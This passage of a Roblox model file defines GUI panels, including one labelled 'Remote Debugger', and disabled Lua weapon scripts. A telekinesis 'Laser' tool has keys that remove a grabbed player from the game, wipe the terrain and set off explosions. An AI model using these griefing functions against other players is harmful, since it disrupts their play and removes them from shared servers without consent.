							<bool name="MultiLine">false</bool>
							<string name="Name">FileName</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>1</YS>
								<YO>-105</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">true</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<bool name="ShowNativeInput">true</bool>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>25</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">PlaceName</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">18</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">0</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
					<Item class="Frame" referent="RBX264EB7B43E684C7483DB0B2C1B48B661">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Entry</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>22</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">false</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextButton" referent="RBXA0D5AE8315864F0B88494DA151D5F28E">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<bool name="AutoButtonColor">true</bool>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">0.600000024</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<bool name="Modal">false</bool>
								<string name="Name">Change</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>10</XO>
									<YS>0</YS>
									<YO>1</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">true</bool>
								<bool name="Selected">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>20</XO>
									<YS>0</YS>
									<YO>20</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<string name="Text"></string>
								<Color3 name="TextColor3">4294967295</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">2</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">2</int>
							</Properties>
							<Item class="TextLabel" referent="RBX9934D30492C14DC49E66BDD533E583FA">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4284572001</Color3>
									<float name="BackgroundTransparency">0.400000006</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<token name="Font">3</token>
									<token name="FontSize">5</token>
									<string name="Name">enabled</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>3</XO>
										<YS>0</YS>
										<YO>3</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>14</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<string name="Text"></string>
									<Color3 name="TextColor3">4279970357</Color3>
									<bool name="TextScaled">false</bool>
									<float name="TextSize">14</float>
									<Color3 name="TextStrokeColor3">4278190080</Color3>
									<float name="TextStrokeTransparency">1</float>
									<float name="TextTransparency">0</float>
									<bool name="TextWrapped">false</bool>
									<token name="TextXAlignment">2</token>
									<token name="TextYAlignment">1</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
							</Item>
						</Item>
						<Item class="TextLabel" referent="RBX96F4F5D3E3F6471C9684C99F60A4B8ED">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">6</token>
								<string name="Name">Info</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>40</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-40</XO>
									<YS>0</YS>
									<YO>22</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Workspace</string>
								<Color3 name="TextColor3">4278190080</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">18</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="Frame" referent="RBXD861558BFB304903BBE69E41A56ED507">
					<Properties>
						<bool name="Active">false</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4294967295</Color3>
						<float name="BackgroundTransparency">0.100000001</float>
						<Color3 name="BorderColor3">4290756543</Color3>
						<int name="BorderSizePixel">1</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">false</bool>
						<string name="Name">RemoteDebugWindow</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>1</XS>
							<XO>0</XO>
							<YS>0</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>300</XO>
							<YS>1</YS>
							<YO>0</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">true</bool>
						<int name="ZIndex">1</int>
					</Properties>
					<Item class="Frame" referent="RBX639DE1A1CDCC42AD9AA3DC952611F5A1">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4293519849</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4287993237</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Header</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>17</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
						<Item class="TextLabel" referent="RBXBF53026983564FA99943F7DCCC846C31">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">1</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">false</bool>
								<token name="Font">3</token>
								<token name="FontSize">5</token>
								<string name="Name">TextLabel</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>4</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>1</XS>
									<XO>-4</XO>
									<YS>1</YS>
									<YO>0</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<string name="Text">Remote Debugger</string>
								<Color3 name="TextColor3">4278190080</Color3>
								<bool name="TextScaled">false</bool>
								<float name="TextSize">14</float>
								<Color3 name="TextStrokeColor3">4278190080</Color3>
								<float name="TextStrokeTransparency">1</float>
								<float name="TextTransparency">0</float>
								<bool name="TextWrapped">false</bool>
								<token name="TextXAlignment">0</token>
								<token name="TextYAlignment">1</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
						</Item>
					</Item>
					<Item class="BindableFunction" referent="RBX9B8221BC1F5E4D5AB96EBA4A85859788">
						<Properties>
							<string name="Name">GetSetting</string>
						</Properties>
					</Item>
					<Item class="TextLabel" referent="RBX7D1682CEDD3147FDB95F9E1FA86384E9">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">11</token>
							<string name="Name">Desc</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>20</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>1</XS>
								<XO>0</XO>
								<YS>0</YS>
								<YO>40</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">Have fun with remotes</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">32</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">true</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">1</int>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="StringValue" referent="RBX68425C53A4714653A5AA8C074EB5258A">
				<Properties>
					<string name="Name">wpns</string>
					<string name="Value">dont delet</string>
				</Properties>
				<Item class="StringValue" referent="RBX73ABBC32820947EC8ED0F0ED8ABD45FB">
					<Properties>
						<string name="Name">Laser</string>
						<string name="Value">dont delete this</string>
					</Properties>
					<Item class="Script" referent="RBX4C616C4EA6C948B4BEE1E62DD838D9E3">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">LineConnect</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[wait()
local check = script.Part2
local part1 = script.Part1.Value
local part2 = script.Part2.Value
local parent = script.Par.Value
local color = script.Color
local line = Instance.new("Part")
line.TopSurface = 0
line.BottomSurface = 0
line.Reflectance = .5
line.Name = "Laser"
line.Locked = true
line.CanCollide = false
line.Anchored = true
line.formFactor = 0
line.Size = Vector3.new(1,1,1)
local mesh = Instance.new("BlockMesh")
mesh.Parent = line
while true do
	if (check.Value==nil) then break end
	if (part1==nil or part2==nil or parent==nil) then break end
	if (part1.Parent==nil or part2.Parent==nil) then break end
	if (parent.Parent==nil) then break end
	local lv = CFrame.new(part1.Position,part2.Position)
	local dist = (part1.Position-part2.Position).magnitude
	line.Parent = parent
	line.BrickColor = color.Value.BrickColor
	line.Reflectance = color.Value.Reflectance
	line.Transparency = color.Value.Transparency
	line.CFrame = CFrame.new(part1.Position+lv.lookVector*dist/2)
	line.CFrame = CFrame.new(line.Position,part2.Position)
	mesh.Scale = Vector3.new(.25,.25,dist)
	wait()
end
line:remove()
script:remove() ]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="LocalScript" referent="RBXB796C624D89F430A8E5268623909917D">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">MainScript</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[wait() 
tool = script.Parent
tool.Handle.BrickColor = script.color.Value
local plr = script.Parent.Parent.Parent

lineconnect = tool.LineConnect
object = nil
mousedown = false
found = false
BP = Instance.new("BodyPosition")
BP.maxForce = Vector3.new(math.huge*math.huge,math.huge*math.huge,math.huge*math.huge) --pwns everyone elses bodyposition
BP.P = BP.P*8 --faster movement. less bounceback.
dist = nil
point = Instance.new("Part")
point.Locked = true
point.Anchored = true
point.formFactor = 0
point.Shape = 0
point.BrickColor = BrickColor.new("Toothpaste")
point.Size = Vector3.new(1,1,1)
point.CanCollide = false
local mesh = Instance.new("SpecialMesh")
mesh.MeshType = "Sphere"
mesh.Scale = Vector3.new(.7,.7,.7)
mesh.Parent = point
handle = tool.Handle
front = tool.Handle
color = tool.Handle
objval = nil
local hooked = false 
local hookBP = BP:clone() 
hookBP.maxForce = Vector3.new(30000,30000,30000) 

function LineConnect(part1,part2,parent)
	local p1 = Instance.new("ObjectValue")
	p1.Value = part1
	p1.Name = "Part1"
	local p2 = Instance.new("ObjectValue")
	p2.Value = part2
	p2.Name = "Part2"
	local par = Instance.new("ObjectValue")
	par.Value = parent
	par.Name = "Par"
	local col = Instance.new("ObjectValue")
	col.Value = color
	col.Name = "Color"
	local s = lineconnect:clone()
	s.Disabled = false
	p1.Parent = s
	p2.Parent = s
	par.Parent = s
	col.Parent = s
	s.Parent = workspace
	if (part2==object) then
		objval = p2
	end
end

function onButton1Down(mouse)
	if (mousedown==true) then return end
	mousedown = true
	coroutine.resume(coroutine.create(function()
		local p = point:clone()
		p.Parent = tool
		LineConnect(front,p,workspace)
		while (mousedown==true) do
			p.Parent = tool
			if (object==nil) then
				if (mouse.Target==nil) then
					local lv = CFrame.new(front.Position,mouse.Hit.p)
					p.CFrame = CFrame.new(front.Position+(lv.lookVector*1000))
				else
					p.CFrame = CFrame.new(mouse.Hit.p)
				end
			else
				LineConnect(front,object,workspace)
				break
			end
			wait()
		end
		p:remove()
	end))
	while (mousedown==true) do
		if (mouse.Target~=nil) then
			local t = mouse.Target
			if (t.Anchored==false) then
				object = t
				dist = (object.Position-front.Position).magnitude
				break
			end
		end
		wait()
	end
	while (mousedown==true) do
		if (object.Parent==nil) then break end
		local lv = CFrame.new(front.Position,mouse.Hit.p)
		BP.Parent = object
		BP.position = front.Position+lv.lookVector*dist
		wait()
	end
	BP:remove()
	object = nil
	objval.Value = nil
end

function onKeyDown(key,mouse) 
	local key = key:lower() 
	local yesh = false 
	if (key=="q") then 
		if (dist>=5) then 
			dist = dist-5 
		end 
	end 
	if key == "l" then 
	if (object==nil) then return end 
	for _,v in pairs(object:children()) do 
	if v.className == "BodyGyro" then 
	return nil 
	end 
	end 
	BG = Instance.new("BodyGyro") 
	BG.maxTorque = Vector3.new(math.huge,math.huge,math.huge) 
	BG.cframe = CFrame.new(object.CFrame.p) 
	BG.Parent = object 
	repeat wait() until(object.CFrame == CFrame.new(object.CFrame.p)) 
	BG.Parent = nil 
	if (object==nil) then return end 
	for _,v in pairs(object:children()) do 
	if v.className == "BodyGyro" then 
	v.Parent = nil 
	end 
	end 
	object.Velocity = Vector3.new(0,0,0) 
	object.RotVelocity = Vector3.new(0,0,0) 
	end 
	if (key=="e") then
		dist = dist+5
	end
	if key == "k" then
		name = object.Parent.Name
		game.Players[name]:Destroy()
	end

	if (key=="f") then 
		if (object==nil) then return end
		local e = Instance.new("Explosion")
		e.Parent = workspace
		e.Position = object.Position
		color.BrickColor = BrickColor.Black()
		point.BrickColor = BrickColor.White() 
		wait(.48)
		color.BrickColor = BrickColor.White() 
		point.BrickColor = BrickColor.Black() 
	end
	if (key=="") then 
		if not hooked then 
		if (object==nil) then return end 
		hooked = true 
		hookBP.position = object.Position 
		if tool.Parent:findFirstChild("Torso") then 
		hookBP.Parent = tool.Parent.Torso 
		if dist ~= (object.Size.x+object.Size.y+object.Size.z)+5 then 
		dist = (object.Size.x+object.Size.y+object.Size.z)+5 
		end 
		end 
		else 
		hooked = false 
		hookBP.Parent = nil 
		end 
	end 
	if (key=="") then 
		if (object==nil) then return end 
		color.BrickColor = BrickColor.new("Toothpaste") 
		point.BrickColor = BrickColor.new("Toothpaste") 
		object.Parent = nil 
		wait(.48) 
		color.BrickColor = BrickColor.new("Toothpaste")
		point.BrickColor = BrickColor.new("Toothpaste")
	end 
	if (key=="") then 
	if (object==nil) then return end 
	local New = object:clone() 
	New.Parent = object.Parent 
	for _,v in pairs(New:children()) do 
	if v.className == "BodyPosition" or v.className == "BodyGyro" then 
	v.Parent = nil 
	end 
	end 
	object = New 
	mousedown = false 
	mousedown = true 
	LineConnect(front,object,workspace) 
		while (mousedown==true) do
		if (object.Parent==nil) then break end
		local lv = CFrame.new(front.Position,mouse.Hit.p)
		BP.Parent = object
		BP.position = front.Position+lv.lookVector*dist
		wait()
	end
	BP:remove()
	object = nil
	objval.Value = nil
	end 
	
if (key=="c") then 
		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		for i = 0,5 do 
			local Mesh = Instance.new("SpecialMesh") 
			--Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			--Decal.Face = i 
			Mesh.MeshId = "http://www.mulrbx.com/asset/?id=1143284632"
			Mesh.TextureId = "http://www.mulrbx.com/asset/?id=1143284657"
			Mesh.Scale = Vector3.new(0.1,0.1,0.1)
			Mesh.Name = "WeightedStorageCubeMesh" 
			Mesh.Parent = Cube 
		end 
	end 

if (key=="b") then 

--		local container = Workspace:FindFirstChild("LocalBin")
--		if not container then
--		container = Instance.new("Camera")
--		container.Name = "LocalBin"
--		container.Parent = Workspace

		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		for i = 0,5 do 
			local Decal = Instance.new("Decal") 
			Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			Decal.Face = i 
			Decal.Name = "WeightedStorageCubeDecal" 
			Decal.Parent = Cube
			Cube.Parent = game.Workspace.Camera

	end 
end

if (key=="x") then 

		local Cube = Instance.new("Part") 
		Cube.Locked = true 
		Cube.Size = Vector3.new(4,4,4) 
		Cube.formFactor = 0 
		Cube.TopSurface = 0 
		Cube.BottomSurface = 0 
		Cube.Name = "WeightedStorageCube" 
		Cube.Parent = workspace 
		Cube.CFrame = CFrame.new(mouse.Hit.p) + Vector3.new(0,2,0) 
		Cube.Anchored = true
		for i = 0,5 do 
			local Decal = Instance.new("Decal") 
			Decal.Texture = "http://www.mulrbx.com/asset/?id=2662260" 
			Decal.Face = i 
			Decal.Name = "WeightedStorageCubeDecal" 
			Decal.Parent = Cube
			Cube.Parent = game.Workspace.Camera

	end 
end

if (key=="u") then 

game.Workspace.Terrain:Clear()

end

if (key=="p") then 

game.Workspace.Camera:ClearAllChildren()

end

if (key=="g") then 

 for i,v in pairs(game.Workspace:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v:Destroy()
    end 
end 
end

if (key=="n") then 
 for i,v in pairs(game.Workspace.Camera:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v.Anchored = true
    end 
end 
end

if (key=="m") then 
 for i,v in pairs(game.Workspace.Camera:GetChildren()) do
        if v.Name == "WeightedStorageCube" then
        v.Anchored = false
    end 
end 
end

	if (key=="") then 
		if dist ~= 15 then 
			dist = 15 
		end 
	end 
end


function onEquipped(mouse)
	keymouse = mouse
	local char = tool.Parent
	human = char.Humanoid
	human.Changed:connect(function() if (human.Health==0) then mousedown = false BP:remove() point:remove() tool:remove() end end)
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
	mouse.Button1Up:connect(function() mousedown = false end)
	mouse.KeyDown:connect(function(key) onKeyDown(key,mouse) end)
	mouse.Icon = "rbxasset://textures\\GunCursor.png"
end



tool.Equipped:connect(onEquipped)]]></ProtectedString>
						</Properties>
						<Item class="BrickColorValue" referent="RBX39D84540BCFB4C728FCE7649ECEED010">
							<Properties>
								<string name="Name">color</string>
								<int name="Value">1019</int>
							</Properties>
						</Item>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX90F7842543954266AD4F4383A03A91C7">
					<Properties>
						<string name="Name">PaintballGun</string>
						<string name="Value">dont delet</string>
					</Properties>
					<Item class="Script" referent="RBX30A2FC8D958C4640A7569945F3813FF5">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Paintball</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[ball = script.Parent
damage = 2



function onTouched(hit)
	local humanoid = hit.Parent:findFirstChild("Humanoid")
	
		
	if hit:getMass() < 1.2 * 200 then
		hit.BrickColor = ball.BrickColor
	end
	-- make a splat
	for i=1,3 do
		local s = Instance.new("Part")
		s.Shape = 1 -- block
		s.formFactor = 2 -- plate
		s.Size = Vector3.new(1,.4,1)
		s.BrickColor = ball.BrickColor
		local v = Vector3.new(math.random(-1,1), math.random(0,1), math.random(-1,1))
		s.Velocity = 15 * v
		s.CFrame = CFrame.new(ball.Position + v, v)
		ball.BrickCleanup:clone().Parent = s
		s.BrickCleanup.Disabled = false
		s.Parent = game.Workspace
		
	end
	

	if humanoid ~= nil then
		tagHumanoid(humanoid)
		humanoid:TakeDamage(damage)
		wait(2)
		untagHumanoid(humanoid)
	end

	connection:disconnect()
	ball.Parent = nil
end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = ball:findFirstChild("creator")
	if tag ~= nil then
		local new_tag = tag:clone()
		new_tag.Parent = humanoid
	end
end


function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild("creator")
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end

connection = ball.Touched:connect(onTouched)

wait(8)
ball.Parent = nil]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="Script" referent="RBXDA57C312812B4F06BC6F8CB2030B3FD0">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">PaintballShooter</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[Tool = script.Parent

colors = {45, 119, 21, 24, 23, 105, 104}

function fire(v)

	Tool.Handle.Fire:play()
	

	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)

	local missile = Instance.new("Part")

        

	local spawnPos = vCharacter.PrimaryPart.Position
	


	spawnPos  = spawnPos + (v * 8)

	missile.Position = spawnPos
	missile.Size = Vector3.new(1,1,1)
	missile.Velocity = v * 100
	missile.BrickColor = BrickColor.new(colors[math.random(1, #colors)])
	missile.Shape = 0
	missile.BottomSurface = 0
	missile.TopSurface = 0
	missile.Name = "Paintball"
	missile.Elasticity = 0
	missile.Reflectance = 0
	missile.Friction = .9

	local force = Instance.new("BodyForce")
	force.force = Vector3.new(0,90,0)
	force.Parent = missile
	
	Tool.BrickCleanup:clone().Parent = missile

	local new_script = script.Parent.Paintball:clone()
	new_script.Disabled = false
	new_script.Parent = missile

	local creator_tag = Instance.new("ObjectValue")
	creator_tag.Value = vPlayer
	creator_tag.Name = "creator"
	creator_tag.Parent = missile
	


	missile.Parent = game.Workspace

end



Tool.Enabled = true
function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print("Humanoid not found")
		return 
	end

	local targetPos = humanoid.TargetPoint
	local lookAt = (targetPos - character.Head.Position).unit

	fire(lookAt)

	wait(.5)

	Tool.Enabled = true
end


script.Parent.Activated:connect(onActivated)

]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="Script" referent="RBX4E3E34D4D9894909B454B19193F2BB27">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">BrickCleanup</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[-- this script removes its parent from the workspace after 24 seconds
while true do
script.Parent.GripRight = Vector3.new(1, 0, 0)
wait(120)
if script.Parent.Name == "PaintballGun" then return end -- so the tool itelf isn't removed
script.Parent.Parent = nil
end ]]></ProtectedString>
						</Properties>
					</Item>
				</Item>
				<Item class="StringValue" referent="RBX5AC0A2E7A598458884ED9FB75400365B">
					<Properties>
						<string name="Name">Superball</string>
						<string name="Value">dont delet</string>
					</Properties>
					<Item class="Script" referent="RBXD83F20DDA2824024A46FB2924C2982B9">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">CannonBall</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[ball = script.Parent
damage = 25

r = game:service("RunService")

last_sound_time = r.Stepped:wait()

function onTouched(hit)

	local now = r.Stepped:wait()

	if (now - last_sound_time > .1) then
		ball.Boing:play()
		last_sound_time = now
	else
		return
	end

	local humanoid = hit.Parent:findFirstChild("Humanoid")
	if humanoid~=nil then
		tagHumanoid(humanoid)
		humanoid:TakeDamage(damage)
		wait(2)
		untagHumanoid(humanoid)
		connection:disconnect()
	else
		damage = damage / 2
		if damage < 2 then
			connection:disconnect()
		end
	end
end

function tagHumanoid(humanoid)
	-- todo: make tag expire
	local tag = ball:findFirstChild("creator")
	if tag ~= nil then
		local new_tag = tag:clone()
		new_tag.Parent = humanoid
	end
end


function untagHumanoid(humanoid)
	if humanoid ~= nil then
		local tag = humanoid:findFirstChild("creator")
		if tag ~= nil then
			tag.Parent = nil
		end
	end
end

connection = ball.Touched:connect(onTouched)


t, s = r.Stepped:wait()
d = t + 5.0 - s
while t < d do
	t = r.Stepped:wait()
end

ball.Parent = nil]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="Script" referent="RBXE3BE7D14FD794AC3B759A46FE77D173E">
						<Properties>
							<bool name="Disabled">true</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">CannonScript</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[Tool = script.Parent


function fire(v)

	Tool.Handle.Boing:play()

	local vCharacter = Tool.Parent
